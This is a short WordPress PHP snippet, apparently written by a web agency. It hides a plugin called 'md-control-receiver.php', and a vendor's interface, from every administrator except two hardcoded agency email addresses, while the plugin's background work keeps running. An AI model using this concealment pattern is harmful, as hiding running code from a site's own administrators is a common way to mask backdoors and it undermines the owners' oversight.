<?php

function md_control_can_manage() {
    if (!current_user_can('manage_options')) {
        return false;
    }

    $user = wp_get_current_user();
    return in_array(strtolower($user->user_email ?? ''), [
        'evan@matthewsdesign.co',
        'webdev@matthewsdesign.co',
    ], true);
}

// WPVibe owns the UI suppression; reuse our account allowlist rather than
// changing its files or a global option that would also hide it from our team.
// Resolve the current user when the filter runs, after authentication is ready.
add_filter('wpvibe_hide_from_admins', function ($hidden) {
    return !md_control_can_manage();
});

// Filter the admin table only; leave update discovery and background work intact.
add_filter('all_plugins', function ($plugins) {
    if (!md_control_can_manage()) {
        unset($plugins[plugin_basename(dirname(__DIR__, 2) . '/md-control-receiver.php')]);
    }
    return $plugins;
});
